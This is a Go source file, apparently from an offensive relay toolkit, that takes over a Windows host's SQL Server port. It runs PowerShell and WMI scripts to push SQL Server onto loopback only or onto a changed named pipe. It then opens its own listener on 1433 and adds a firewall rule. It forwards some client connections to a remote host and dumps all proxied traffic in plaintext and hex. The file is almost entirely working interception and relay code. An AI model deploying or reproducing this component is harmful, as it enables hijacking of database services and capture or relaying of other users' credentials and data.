package mssql

import (
	"encoding/hex"
	"fmt"
	"io"
	"net"
	"strings"
	"sync/atomic"

	"relaybox/pkg/system/executil"
	"relaybox/pkg/system/logging"
)

type MSSQL struct {
	Listeners      []net.Listener
	ExePath        string
	LocalAddresses []string
	RemoteAddr     string
	WinAPI         bool
	Logger         *logging.Logger
	SeenThreshold  int
	NamedPipes     bool
	OldNamePipe    string
}

func NewMSSQL(exePath string, localAddresses []string, remoteAddr string, namePipe, verbose bool) *MSSQL {
	return &MSSQL{
		ExePath:        exePath,
		LocalAddresses: localAddresses,
		RemoteAddr:     remoteAddr,
		Logger:         logging.NewLogger("MSSQL", verbose),
		SeenThreshold:  4,
		NamedPipes:     namePipe,
		OldNamePipe:    "",
	}
}

func (m *MSSQL) GetPort() string {
	if m.NamedPipes {
		return ":445 named pipes"
	}
	return ":1433"
}

func (m *MSSQL) GetServiceName() string {
	return "MSSQL"
}

func (m *MSSQL) Start() int {
	if m.NamedPipes {
		m.Logger.Log("Reconfiguring SQL Server network settings to use named pipes only...")
		m.bindToNamedPipes()
		return 0
	}
	m.Logger.Log("Attempting to reconfigure SQL Server network settings via WMI...")
	err := m.rebindMSSQL()
	if err != nil {
		m.Logger.Log(fmt.Sprintf("Failed to configure MSSQL: %v", err))
		return 1
	}

	for _, addr := range m.LocalAddresses {
		listener, err := net.Listen("tcp", addr+m.GetPort())
		if err != nil {
			m.Logger.Verbose(fmt.Sprintf("Failed to listen on %s: %v", addr, err))
			continue
		}
		m.Listeners = append(m.Listeners, listener)
		m.Logger.Log(fmt.Sprintf("Proxy listening on %s, forwarding WinRM to %s", addr, m.RemoteAddr))
	}

	if len(m.Listeners) == 0 {
		m.Logger.Log("No listeners created, exiting...")
		return 1
	}

	m.createMSSQLFirewallRule()

	for _, listener := range m.Listeners {
		go m.listenerHandler(listener)
	}

	m.Logger.Log("SQL Server WMI reconfiguration complete.")
	return 0
}

func (m *MSSQL) Stop() {
	if m.NamedPipes {
		m.Logger.Log("Resetting SQL Server network settings to default...")
		m.resetMSSQLToTCP()
		return
	}
	m.Logger.Log("Closing all listeners, do not kill this...")
	for _, listener := range m.Listeners {
		// This can at times be very slow, maybe there is a way to just kill it
		if err := listener.Close(); err != nil {
			m.Logger.Verbose(fmt.Sprintf("Error closing listener: %v", err))
		}
	}
	m.Logger.Log("Reverting SQL Server network settings via WMI...")
	m.setDefaultMSSQL()
	m.removeMSSQLFirewallRule()
}

// Take over via named pipes!

func (m *MSSQL) bindToNamedPipes() {
	out, _ := executil.RunCommandPowershellWithOutput(
		`[System.Reflection.Assembly]::LoadWithPartialName('Microsoft.SqlServer.SqlWmiManagement') | Out-Null
$mc = New-Object Microsoft.SqlServer.Management.Smo.Wmi.ManagedComputer 'localhost'
$instanceName = $mc.ServerInstances.name

$instance = $mc.ServerInstances[$instanceName]

$pro = $instance.ServerProtocols
$npProtocol = $pro['Np']
$tcpProtocol = $pro['Tcp']
$npProtocol.IsEnabled = $true                # Named Pipes
Write-Output $npProtocol.ProtocolProperties[1].Value # Save old named pipe
$npProtocol.ProtocolProperties[1].Value = '\\.\pipe\sql\query' # Change so clients are forced to use named pipes
$tcpProtocol.IsEnabled = $false               # TCP/IP
$tcpProtocol.Alter()
$npProtocol.Alter()
Restart-Service ($mc.Services[0].Name)`)
	fmt.Println("old named pipe", out)
	m.OldNamePipe = out
}

func (m *MSSQL) resetMSSQLToTCP() {
	executil.RunCommandPowershell(
		fmt.Sprintf(`[System.Reflection.Assembly]::LoadWithPartialName('Microsoft.SqlServer.SqlWmiManagement') | Out-Null
$mc = New-Object Microsoft.SqlServer.Management.Smo.Wmi.ManagedComputer 'localhost'
$instanceName = $mc.ServerInstances.name

$instance = $mc.ServerInstances[$instanceName]

$pro = $instance.ServerProtocols
$npProtocol = $pro['Np']
$tcpProtocol = $pro['Tcp']
$npProtocol.ProtocolProperties[1].Value = '%s' # Change so clients are forced to use named pipes
$tcpProtocol.IsEnabled = $true               # TCP/IP
$tcpProtocol.Alter()
$npProtocol.Alter()
Restart-Service ($mc.Services[0].Name)`, m.OldNamePipe))
}

// Port 1433 takeover

// PROXY HANDLING

func (m *MSSQL) listenerHandler(listener net.Listener) {
	history := map[string]int{}
	for {
		conn, err := listener.Accept()
		if err != nil {
			m.Logger.Verbose(fmt.Sprintf("Accept error: %v", err))
			return
		}

		m.Logger.Log(fmt.Sprintf("Accepted MSSQL connection from %s", conn.RemoteAddr()))
		client := strings.Split(conn.RemoteAddr().String(), ":")[0]

		if _, ok := history[client]; ok {
			history[client]++
		} else {
			history[client] = 1
		}

		// FIX: does not work for all clients
		if history[client]%m.SeenThreshold == 0 {
			target := m.RemoteAddr + m.GetPort()
			m.Logger.Verbose(fmt.Sprintf("Forwarding to remote MSSQL for client %s", client))
			go m.handleConnection(conn, target, false)
		} else {
			target := "127.0.0.1:" + m.GetPort()
			m.Logger.Verbose(fmt.Sprintf("Forwarding to local MSSQL for client %s", client))
			go m.handleConnection(conn, target, true)
		}

	}
}

func (m *MSSQL) handleConnection(localConn net.Conn, remoteAddr string, isLocal bool) {
	defer localConn.Close()

	remoteConn, err := net.Dial("tcp", remoteAddr)
	if err != nil {
		m.Logger.Verbose(fmt.Sprintf("Failed to connect to %s: %v", remoteAddr, err))
		return
	}
	defer remoteConn.Close()

	var closed uint32
	go func() {
		if _, err := m.copyStream(remoteConn, localConn, &closed, "client"); err != nil {
			m.Logger.Verbose(fmt.Sprintf("Error proxying client→server: %v", err))
		}
		atomic.StoreUint32(&closed, 1)
	}()

	if _, err := m.copyStream(localConn, remoteConn, &closed, "server"); err != nil {
		m.Logger.Verbose(fmt.Sprintf("Error proxying server→client: %v", err))
		atomic.StoreUint32(&closed, 1)
	}
}

func (m *MSSQL) copyStream(dst io.Writer, src io.Reader, closeFlag *uint32, label string) (int64, error) {
	buf := make([]byte, 32*1024)
	var total int64

	for atomic.LoadUint32(closeFlag) == 0 {
		n, err := src.Read(buf)
		if n > 0 {
			data := buf[:n]
			fmt.Println("[" + label + "]" + "----Data----")
			fmt.Println(string(data))
			fmt.Println("Hex", hex.EncodeToString(data))
			written, werr := dst.Write(data)
			if werr != nil {
				return total, werr
			}
			if written != len(data) {
				return total, io.ErrShortWrite
			}
			total += int64(written)
		}

		if err != nil {
			if err == io.EOF {
				return total, nil
			}
			return total, err
		}
	}
	return total, nil
}

func (m *MSSQL) createMSSQLFirewallRule() {
	m.Logger.Log("Creating MSSQL firewall rule...")
	localAddressesStr := ""
	for _, addr := range m.LocalAddresses {
		localAddressesStr += fmt.Sprintf(`"%s",`, addr)
	}
	localAddressesStr = strings.TrimSuffix(localAddressesStr, ",")
	ruleCmd := fmt.Sprintf(
		`New-NetFirewallRule -DisplayName "MSSQL" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 1433 -LocalAddress @(%s) -Program "%s"`,
		localAddressesStr,
		m.ExePath,
	)
	executil.RunCommandPowershell(ruleCmd)
	m.Logger.Log("MSSQL firewall rule created.")
}

func (m *MSSQL) removeMSSQLFirewallRule() {
	m.Logger.Log("Removing MSSQL firewall rule...")
	executil.RunCommandPowershell(`Remove-NetFirewallRule -DisplayName "MSSQL"`)
	m.Logger.Log("MSSQL firewall rule removed.")
}

func (m *MSSQL) rebindMSSQL() error {
	return executil.RunCommandPowershell(`[System.Reflection.Assembly]::LoadWithPartialName('Microsoft.SqlServer.SqlWmiManagement') | Out-Null
$mc = New-Object Microsoft.SqlServer.Management.Smo.Wmi.ManagedComputer 'localhost'
$instanceName = $mc.ServerInstances.name

$loopIps       = @('127.0.0.1','::1')

$instance = $mc.ServerInstances[$instanceName]
if ($null -eq $instance) {
    Write-Error "Instance '$instanceName' not found."
}

$tcpProto = $instance.ServerProtocols['Tcp']
if ($null -eq $tcpProto) {
    Write-Error "TCP protocol config not found."
}

$uri = $tcpProto.Urn.Value

foreach ($ip in $tcpProto.IpAddresses) {
    $ipAddr = $ip.IPAddress
    $props  = $ip.IPAddressProperties

    if ($ip.Name.Equals('IPAll')) {
        continue
    }
    if ($loopIps -contains $ipAddr) {
        $mc.GetSmoObject($ip.Urn).IPAddressProperties[4].Value = '1433' # Set port for localhost
        $mc.GetSmoObject($ip.Urn).IPAddressProperties[1].Value = $true # Enable localhost
    } else {
        # Disable all non localhost interfaces
        $mc.GetSmoObject($ip.Urn).IPAddressProperties[1].Value = $false
    }
}

# Disable listen on all ips
$tcpProto.ProtocolProperties[2].Value = $false
$tcpProto.Alter()
Restart-Service ($mc.Services[0].Name)
`)
}

func (m *MSSQL) setDefaultMSSQL() error {
	return executil.RunCommandPowershell(`[System.Reflection.Assembly]::LoadWithPartialName('Microsoft.SqlServer.SqlWmiManagement') | Out-Null
$mc = New-Object Microsoft.SqlServer.Management.Smo.Wmi.ManagedComputer 'localhost'
$instanceName = $mc.ServerInstances.name

$loopIps       = @('127.0.0.1','::1')

$instance = $mc.ServerInstances[$instanceName]
if ($null -eq $instance) {
    Write-Error "Instance '$instanceName' not found."
}

$tcpProto = $instance.ServerProtocols['Tcp']
if ($null -eq $tcpProto) {
    Write-Error "TCP protocol config not found."
}

$uri = $tcpProto.Urn.Value

foreach ($ip in $tcpProto.IpAddresses) {
    $ipAddr = $ip.IPAddress
    $props  = $ip.IPAddressProperties

    if ($ip.Name.Equals('IPAll')) {
        continue
    }
    if ($loopIps -contains $ipAddr) {
        $mc.GetSmoObject($ip.Urn).IPAddressProperties[4].Value = '' # Set port for localhost
        $mc.GetSmoObject($ip.Urn).IPAddressProperties[1].Value = $false # Enable localhost
    } else {
        # Disable all non localhost interfaces
        $mc.GetSmoObject($ip.Urn).IPAddressProperties[1].Value = $true
    }
}

# Disable listen on all ips
$tcpProto.ProtocolProperties[2].Value = $true
$tcpProto.Alter()
Restart-Service ($mc.Services[0].Name)
`)
}
